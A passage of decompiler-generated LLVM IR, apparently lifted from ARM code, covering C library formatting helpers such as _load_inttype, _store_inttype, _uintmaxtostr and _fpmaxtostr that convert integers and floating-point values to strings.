  %v4_179f0 = zext i8 %v3_179f0 to i32
  %v3_179f4 = mul nuw nsw i32 %v4_179f0, 256
  store i32 %v3_179f4, i32* %r3.global-to-local, align 4
  %v1_179f8 = and i32 %v3_179f4, 2816
  store i32 %v1_179f8, i32* %r0.global-to-local, align 4
  %v2_179f8 = icmp eq i32 %v1_179f8, 0
  store i1 %v2_179f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179f8, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_179e0
  %v2_179fc = add i32 %v0_179f0, 12
  %v3_179fc = inttoptr i32 %v2_179fc to i32*
  %v4_179fc = load i32, i32* %v3_179fc, align 4
  store i32 %v4_179fc, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_179e0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_17a04 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a04 = trunc i32 %v0_17a04 to i8
  %v3_17a04 = inttoptr i32 %v0_179f0 to i8*
  store i8 %v1_17a04, i8* %v3_17a04, align 1
  %v0_17a08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17a08, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_17a08 = load i32, i32* %r3.global-to-local, align 4
  %v2_17a08 = load i32, i32* @r4, align 4
  %v3_17a08 = add i32 %v2_17a08, 28
  %v4_17a08 = inttoptr i32 %v3_17a08 to i32*
  store i32 %v1_17a08, i32* %v4_17a08, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_17a0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17a0c, i32* @r4, align 4
  %v8_17a0c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_17a0c

; uselistorder directives
  uselistorder i32 %v3_179f4, { 1, 0 }
  uselistorder i32 %v3_179e8, { 1, 0 }
  uselistorder i32 %v3_179c8, { 1, 0 }
  uselistorder i32 %v2_179cc, { 0, 2, 1 }
  uselistorder i1 %v2_1797c, { 1, 0 }
  uselistorder i32 %v3_17968, { 1, 0 }
  uselistorder i32 %v0_1798c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_17934, { 1, 0 }
  uselistorder i32 %v5_17918, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 1024, { 0, 7, 8, 2, 9, 1, 10, 11, 12, 4, 5, 6, 3 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_179e0, { 1, 0 }
  uselistorder label %dec_label_pc_179bc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_179a4, { 1, 0 }
  uselistorder label %dec_label_pc_17954, { 1, 0 }
  uselistorder label %dec_label_pc_17940, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_17a10 = load i32, i32* @r2, align 4
  %v1_17a10 = icmp slt i32 %v0_17a10, 0
  %v0_17a14 = load i32, i32* @r0, align 4
  %v1_17a18 = and i32 %v0_17a14, 2048
  %v2_17a4c = icmp eq i32 %v1_17a18, 0
  br i1 %v1_17a10, label %dec_label_pc_17a4c, label %dec_label_pc_17a20

dec_label_pc_17a20:                               ; preds = %entry
  br i1 %v2_17a4c, label %dec_label_pc_17a28, label %dec_label_pc_17a54

dec_label_pc_17a28:                               ; preds = %dec_label_pc_17a20
  %v7_17a28 = icmp eq i32 %v0_17a14, 256
  %v0_17a2c = load i32, i32* @r1, align 4
  %v1_17a2c = inttoptr i32 %v0_17a2c to i32*
  %v2_17a2c = load i32, i32* %v1_17a2c, align 4
  %v2_17a30 = urem i32 %v2_17a2c, 256
  %v2_17a30.v2_17a2c = select i1 %v7_17a28, i32 %v2_17a30, i32 %v2_17a2c
  br i1 %v7_17a28, label %.thread, label %dec_label_pc_17a38

dec_label_pc_17a38:                               ; preds = %dec_label_pc_17a28
  %v7_17a38 = icmp eq i32 %v0_17a14, 512
  br i1 %v7_17a38, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17a38
  %v4_17a40 = urem i32 %v2_17a30.v2_17a2c, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17a38, %dec_label_pc_17a28, %bb
  %v1_17a48 = phi i32 [ %v2_17a2c, %dec_label_pc_17a38 ], [ %v2_17a30, %dec_label_pc_17a28 ], [ %v4_17a40, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_17a48

dec_label_pc_17a4c:                               ; preds = %entry
  br i1 %v2_17a4c, label %dec_label_pc_17a5c, label %dec_label_pc_17a54

dec_label_pc_17a54:                               ; preds = %dec_label_pc_17a20, %dec_label_pc_17a4c
  %v0_17a54 = load i32, i32* @r1, align 4
  %v1_17a54 = inttoptr i32 %v0_17a54 to i32*
  %v2_17a54 = load i32, i32* %v1_17a54, align 4
  %v3_17a54 = add i32 %v0_17a54, 4
  %v4_17a54 = inttoptr i32 %v3_17a54 to i32*
  %v5_17a54 = load i32, i32* %v4_17a54, align 4
  store i32 %v5_17a54, i32* @r1, align 4
  ret i32 %v2_17a54

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a4c
  %v7_17a5c = icmp eq i32 %v0_17a14, 256
  %v0_17a60 = load i32, i32* @r1, align 4
  %v1_17a60 = inttoptr i32 %v0_17a60 to i32*
  %v2_17a60 = load i32, i32* %v1_17a60, align 4
  %v2_17a64 = urem i32 %v2_17a60, 256
  %v2_17a64.v2_17a60 = select i1 %v7_17a5c, i32 %v2_17a64, i32 %v2_17a60
  br i1 %v7_17a5c, label %.thread2, label %dec_label_pc_17a6c

dec_label_pc_17a6c:                               ; preds = %dec_label_pc_17a5c
  %v7_17a6c = icmp eq i32 %v0_17a14, 512
  br i1 %v7_17a6c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_17a6c
  %v4_17a70 = mul i32 %v2_17a64.v2_17a60, 65536
  %v4_17a74 = sdiv i32 %v4_17a70, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17a6c, %dec_label_pc_17a5c, %bb5
  %v0_17a78 = phi i32 [ %v2_17a60, %dec_label_pc_17a6c ], [ %v2_17a64, %dec_label_pc_17a5c ], [ %v4_17a74, %bb5 ]
  %v3_17a78 = ashr i32 %v0_17a78, 31
  store i32 %v3_17a78, i32* @r1, align 4
  ret i32 %v0_17a78

; uselistorder directives
  uselistorder i32 %v0_17a78, { 1, 0 }
  uselistorder i32 %v2_17a64, { 1, 0 }
  uselistorder i32 %v2_17a60, { 1, 2, 0 }
  uselistorder i32 %v2_17a30, { 1, 0 }
  uselistorder i32 %v2_17a2c, { 1, 2, 0 }
  uselistorder i1 %v2_17a4c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17a54, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_17a80 = icmp eq i32 %arg2, 256
  br i1 %v7_17a80, label %dec_label_pc_17aac, label %dec_label_pc_17a88

dec_label_pc_17a88:                               ; preds = %entry
  %v7_17a88 = icmp eq i32 %arg2, 2048
  br i1 %v7_17a88, label %dec_label_pc_17a90, label %dec_label_pc_17a98

dec_label_pc_17a90:                               ; preds = %dec_label_pc_17a88
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_17a90 = add i32 %tmp2, 4
  %v6_17a90 = inttoptr i32 %v5_17a90 to i32*
  store i32 %arg4, i32* %v6_17a90, align 4
  ret i32 %tmp2

dec_label_pc_17a98:                               ; preds = %dec_label_pc_17a88
  %v7_17a98 = icmp eq i32 %arg2, 512
  br i1 %v7_17a98, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_17a98
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_17a98
  %v4_17a9c = sdiv i32 %arg3, 256
  %v1_17aa8 = trunc i32 %v4_17a9c to i8
  %v4_17aa8 = add i32 %tmp2, 1
  %v5_17aa8 = inttoptr i32 %v4_17aa8 to i8*
  store i8 %v1_17aa8, i8* %v5_17aa8, align 1
  br label %dec_label_pc_17aac

dec_label_pc_17aac:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17aac, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_17ab8 = icmp slt i32 %arg4, 0
  %v2_17ab8 = icmp eq i32 %arg4, 0
  store i1 %v2_17ab8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_17ab8, label %dec_label_pc_17ad0, label %dec_label_pc_17af0

dec_label_pc_17ad0:                               ; preds = %entry
  %v1_17ad0 = icmp slt i32 %arg3, 0
  %v2_17ad0 = icmp eq i32 %arg3, 0
  store i1 %v2_17ad0, i1* %cpsr_z.global-to-local, align 1
  %v1_17ad4 = sub i32 0, %arg4
  store i32 %v1_17ad4, i32* %r7.global-to-local, align 4
  br i1 %v1_17ad0, label %dec_label_pc_17adc, label %dec_label_pc_17af0

dec_label_pc_17adc:                               ; preds = %dec_label_pc_17ad0
  %v1_17ae0 = sub i32 0, %arg2
  store i32 %v1_17ae0, i32* %r5.global-to-local, align 4
  %v2_17ae0 = icmp eq i32 %arg2, 0
  %v2_17ae4 = icmp eq i1 %v2_17ae0, false
  %v5_17ae4 = sext i1 %v2_17ae4 to i32
  %v6_17ae4 = sub i32 %v5_17ae4, %arg3
  store i32 %v6_17ae4, i32* %r6.global-to-local, align 4
  %v19_17ae4 = icmp eq i32 %v6_17ae4, 0
  store i1 %v19_17ae4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17af8

dec_label_pc_17af0:                               ; preds = %dec_label_pc_17ad0, %entry
  br label %dec_label_pc_17af8

dec_label_pc_17af8:                               ; preds = %dec_label_pc_17adc, %dec_label_pc_17af0
  %storemerge = phi i8 [ 0, %dec_label_pc_17af0 ], [ 1, %dec_label_pc_17adc ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_17b00 = load i32, i32* %r7.global-to-local, align 4
  %v2_17b08 = udiv i32 -1, %v0_17b00
  store i32 %v2_17b08, i32* %fp.global-to-local, align 4
  %v2_17b18 = urem i32 -1, %v0_17b00
  %v1_17b1c = add i32 %v2_17b18, 1
  store i32 %v1_17b1c, i32* %sb.global-to-local, align 4
  %v9_17b20 = icmp eq i32 %v1_17b1c, %v0_17b00
  store i1 %v9_17b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17b20, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17af8
  %v1_17b24 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_17b24, i32* %sb.global-to-local, align 4
  %v2_17b28 = add i32 %v2_17b08, 1
  store i32 %v2_17b28, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17af8, %bb
  %v0_17b2c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17b2c, i32* %sl.global-to-local, align 4
  %v0_17b30 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17b30, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17b34

dec_label_pc_17b34thread-pre-split:               ; preds = %bb21
  %v0_17b34.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_17b3c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17b34

dec_label_pc_17b34:                               ; preds = %dec_label_pc_17b34thread-pre-split, %.thread
  %v0_17ba4 = phi i32 [ %v0_17b3c.pre, %dec_label_pc_17b34thread-pre-split ], [ %v0_17b00, %.thread ]
  %v0_17b50 = phi i32 [ %v0_17b34.pr, %dec_label_pc_17b34thread-pre-split ], [ %v0_17b2c, %.thread ]
  %v2_17b34 = icmp eq i32 %v0_17b50, 0
  store i1 %v2_17b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b34, label %dec_label_pc_17ba0, label %dec_label_pc_17b44

dec_label_pc_17b44:                               ; preds = %dec_label_pc_17b34
  %v2_17b44 = urem i32 %v0_17b50, %v0_17ba4
  %v2_17b54 = udiv i32 %v0_17b50, %v0_17ba4
  store i32 %v2_17b54, i32* %sl.global-to-local, align 4
  %v0_17b60 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b64 = urem i32 %v0_17b60, %v0_17ba4
  %v1_17b6c = load i32, i32* %sb.global-to-local, align 4
  %v3_17b6c = mul i32 %v1_17b6c, %v2_17b44
  %v4_17b6c = add i32 %v3_17b6c, %v2_17b64
  store i32 %v4_17b6c, i32* %r5.global-to-local, align 4
  %v2_17b74 = udiv i32 %v0_17b60, %v0_17ba4
  %v0_17b7c = load i32, i32* %fp.global-to-local, align 4
  %v3_17b7c = mul i32 %v0_17b7c, %v2_17b44
  %v4_17b7c = add i32 %v3_17b7c, %v2_17b74
  %v2_17b84 = udiv i32 %v4_17b6c, %v0_17ba4
  %v2_17b8c = add i32 %v4_17b7c, %v2_17b84
  br label %dec_label_pc_17bc0

dec_label_pc_17ba0:                               ; preds = %dec_label_pc_17b34
  %v0_17ba0 = load i32, i32* %r6.global-to-local, align 4
  %v2_17bb8 = udiv i32 %v0_17ba0, %v0_17ba4
  br label %dec_label_pc_17bc0

dec_label_pc_17bc0:                               ; preds = %dec_label_pc_17b44, %dec_label_pc_17ba0
  %storemerge24 = phi i32 [ %v2_17bb8, %dec_label_pc_17ba0 ], [ %v2_17b8c, %dec_label_pc_17b44 ]
  %v0_17bdc = phi i32 [ %v2_17bb8, %dec_label_pc_17ba0 ], [ %v2_17b8c, %dec_label_pc_17b44 ]
  %v1_17bdc = phi i32 [ 0, %dec_label_pc_17ba0 ], [ %v2_17b54, %dec_label_pc_17b44 ]
  %v4_17b6c.pn = phi i32 [ %v0_17ba0, %dec_label_pc_17ba0 ], [ %v4_17b6c, %dec_label_pc_17b44 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_17bc8 = urem i32 %v4_17b6c.pn, %v0_17ba4
  %v3_17bc0 = load i32, i32* %stack_var_0, align 4
  %v2_17bc4 = icmp ugt i32 %v0_17bc8, 8
  %v7_17bc4 = icmp eq i32 %v0_17bc8, 9
  store i1 %v7_17bc4, i1* %cpsr_z.global-to-local, align 1
  %v1_17bcc = add i32 %v0_17bc8, 48
  %v0_17bd4 = load i32, i32* %r8.global-to-local, align 4
  %v1_17bd4 = add i32 %v0_17bd4, -1
  store i32 %v1_17bd4, i32* %r8.global-to-local, align 4
  %v2_17bd8 = xor i1 %v7_17bc4, true
  %v3_17bd8 = and i1 %v2_17bc4, %v2_17bd8
  %extract.t = trunc i32 %v1_17bcc to i8
  br i1 %v3_17bd8, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_17bc0
  %v2_17bc8 = add i32 %v3_17bc0, %v0_17bc8
  %extract.t8 = trunc i32 %v2_17bc8 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_17bc0, %bb20
  %v0_17be0.off0 = phi i8 [ %extract.t, %dec_label_pc_17bc0 ], [ %extract.t8, %bb20 ]
  %v2_17bdc = or i32 %v0_17bdc, %v1_17bdc
  %v4_17bdc = icmp eq i32 %v2_17bdc, 0
  store i1 %v4_17bdc, i1* %cpsr_z.global-to-local, align 1
  %v3_17be0 = inttoptr i32 %v1_17bd4 to i8*
  store i8 %v0_17be0.off0, i8* %v3_17be0, align 1
  %v0_17be4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17be4, label %dec_label_pc_17be8, label %dec_label_pc_17b34thread-pre-split

dec_label_pc_17be8:                               ; preds = %bb21
  %v2_17be8 = load i8, i8* %stack_var_-40, align 1
  %v2_17bec = icmp eq i8 %v2_17be8, 0
  store i1 %v2_17bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17bec, label %dec_label_pc_17be8..thread2_crit_edge, label %bb22

dec_label_pc_17be8..thread2_crit_edge:            ; preds = %dec_label_pc_17be8
  %v0_17bf8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_17be8
  %v3_17bf4 = load i32, i32* %r8.global-to-local, align 4
  %v4_17bf4 = add i32 %v3_17bf4, -1
  %v5_17bf4 = inttoptr i32 %v4_17bf4 to i8*
  store i8 45, i8* %v5_17bf4, align 1
  %v6_17bf4 = load i32, i32* %r8.global-to-local, align 4
  %v7_17bf4 = add i32 %v6_17bf4, -1
  store i32 %v7_17bf4, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17be8..thread2_crit_edge, %bb22
  %v0_17bf8 = phi i32 [ %v0_17bf8.pre, %dec_label_pc_17be8..thread2_crit_edge ], [ %v7_17bf4, %bb22 ]
  ret i32 %v0_17bf8

; uselistorder directives
  uselistorder i32 %v0_17bc8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17ba4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_17bc0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_17af8, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17c04 = load i32, i32* @r4, align 4
  store i32 %v3_17c04, i32* %stack_var_-36, align 4
  %v6_17c04 = load i32, i32* @r5, align 4
  %v9_17c04 = load i32, i32* @r6, align 4
  %v12_17c04 = load i32, i32* @r7, align 4
  %v15_17c04 = load i32, i32* @r8, align 4
  %v18_17c04 = load i32, i32* @sb, align 4
  %v1_17c0c = add i32 %tmp, 8
  %v2_17c0c = inttoptr i32 %v1_17c0c to i8*
  %v3_17c0c = load i8, i8* %v2_17c0c, align 1
  %v4_17c0c = zext i8 %v3_17c0c to i32
  store i32 %v4_17c0c, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_17c14 = or i32 %v4_17c0c, 32
  %v2_17c18 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_17c1c = icmp ult i32 %v1_17c14, 97
  store i1 %v6_17c1c, i1* %cpsr_n.global-to-local, align 1
  %v7_17c1c = icmp eq i32 %v1_17c14, 97
  store i1 %v7_17c1c, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_17c28 = load i32, i32* %arg4, align 4
  store i32 %v2_17c28, i32* %r8.global-to-local, align 4
  br i1 %v7_17c1c, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_17c2c = add nuw nsw i32 %v4_17c0c, 6
  store i32 %v2_17c2c, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_17c40 = phi i32 [ 101, %entry ], [ %v2_17c2c, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_17c38 = add i32 %tmp, 12
  %v2_17c38 = inttoptr i32 %v1_17c38 to i32*
  %v3_17c38 = load i32, i32* %v2_17c38, align 4
  store i32 %v3_17c38, i32* %r2.global-to-local, align 4
  %v1_17c3c = add i32 %tmp, 4
  %v2_17c3c = inttoptr i32 %v1_17c3c to i32*
  %v3_17c3c = load i32, i32* %v2_17c3c, align 4
  store i32 %v3_17c3c, i32* %r1.global-to-local, align 4
  br i1 %v7_17c1c, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_17c40 = urem i32 %v1_17c40, 256
  store i32 %v2_17c40, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17c44 = icmp slt i32 %v2_17c28, 0
  store i1 %v1_17c44, i1* %cpsr_n.global-to-local, align 1
  %v2_17c44 = icmp eq i32 %v2_17c28, 0
  store i1 %v2_17c44, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_17c44, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_17c50 = and i32 %v3_17c38, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17c50 = icmp eq i32 %v1_17c50, 0
  store i1 %v2_17c50, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_17c50, label %dec_label_pc_17c64, label %dec_label_pc_17cd4

dec_label_pc_17c64:                               ; preds = %bb184
  %v1_17c64 = urem i32 %v3_17c38, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17c64 = icmp eq i32 %v1_17c64, 0
  store i1 %v2_17c64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c64, label %.thread10, label %dec_label_pc_17cd4

dec_label_pc_17cd4:                               ; preds = %dec_label_pc_17c64, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_17c64 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_17cd8 = add i32 %tmp, 16
  %v3_17cd8 = inttoptr i32 %v2_17cd8 to i32*
  store i32 32, i32* %v3_17cd8, align 4
  %v0_17ce0 = load i32, i32* %r7.global-to-local, align 4
  %v1_17ce0 = add i32 %v0_17ce0, -96
  %v3_17ce0 = sub i32 95, %v0_17ce0
  %v4_17ce0 = and i32 %v3_17ce0, %v0_17ce0
  %v5_17ce0 = icmp slt i32 %v4_17ce0, 0
  store i1 %v5_17ce0, i1* %cpsr_v.global-to-local, align 1
  %v6_17ce0 = icmp slt i32 %v1_17ce0, 0
  store i1 %v6_17ce0, i1* %cpsr_n.global-to-local, align 1
  %v7_17ce0 = icmp eq i32 %v0_17ce0, 96
  store i1 %v7_17ce0, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_17ce0, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_17cd4
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_17cd4, %bb185
  %v4_17cf8 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_17cd4 ]
  %v4_17cf8..v1_17c88 = select i1 %tmp242, i32 %v4_17cf8, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_1e1a4.1112 to i32), i32* %r2.global-to-local, align 4
  %v2_17d04 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_17d04, i32* %r6.global-to-local, align 4
  %v2_17d08 = add i32 %v4_17cf8..v1_17c88, ptrtoint ([4 x i8]* @global_var_1e1a4.1112 to i32)
  store i32 %v2_17d08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1818c

.thread10:                                        ; preds = %dec_label_pc_17c64
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_17d90 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_17d90, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17d98

dec_label_pc_17d98:                               ; preds = %dec_label_pc_17e08, %.thread10
  %v3_17dac = phi i32 [ %v2_17df8, %dec_label_pc_17e08 ], [ %v3_17c04, %.thread10 ]
  %v1_17dac = phi i1 [ %v5_17e0c, %dec_label_pc_17e08 ], [ false, %.thread10 ]
  %v0_17dac = phi i1 [ %v6_17e0c, %dec_label_pc_17e08 ], [ false, %.thread10 ]
  %v2_17dac = xor i1 %v1_17dac, %v0_17dac
  br i1 %v2_17dac, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_17d98
  %v4_17dac = sub i32 0, %v3_17dac
  store i32 %v4_17dac, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_17d98, %bb186
  %v0_17db0 = phi i32 [ %v3_17dac, %dec_label_pc_17d98 ], [ %v4_17dac, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17db0 = icmp slt i32 %v0_17db0, 0
  store i1 %v1_17db0, i1* %cpsr_n.global-to-local, align 1
  %v2_17db0 = icmp eq i32 %v0_17db0, 0
  store i1 %v2_17db0, i1* %cpsr_z.global-to-local, align 1
  %v0_17dcc = load i32, i32* %sl.global-to-local, align 4
  %v1_17dcc = add i32 %v0_17dcc, 9
  store i32 %v1_17dcc, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17dd4

dec_label_pc_17dd4:                               ; preds = %dec_label_pc_17dd4.dec_label_pc_17dd4_crit_edge, %bb187
  %v1_17de8 = phi i32 [ %v1_17de8.pre, %dec_label_pc_17dd4.dec_label_pc_17dd4_crit_edge ], [ %v1_17dcc, %bb187 ]
  %v0_17de0 = phi i32 [ %v0_17dfc, %dec_label_pc_17dd4.dec_label_pc_17dd4_crit_edge ], [ 0, %bb187 ]
  %v0_17dec = phi i32 [ %v2_17df8, %dec_label_pc_17dd4.dec_label_pc_17dd4_crit_edge ], [ %v0_17db0, %bb187 ]
  %v2_17ddc = urem i32 %v0_17dec, 10
  %v1_17de0 = add i32 %v0_17de0, 1
  store i32 %v1_17de0, i32* %r5.global-to-local, align 4
  %v1_17de4 = or i32 %v2_17ddc, 48
  store i32 %v1_17de4, i32* %r2.global-to-local, align 4
  %v2_17de8 = sub i32 %v1_17de8, %v1_17de0
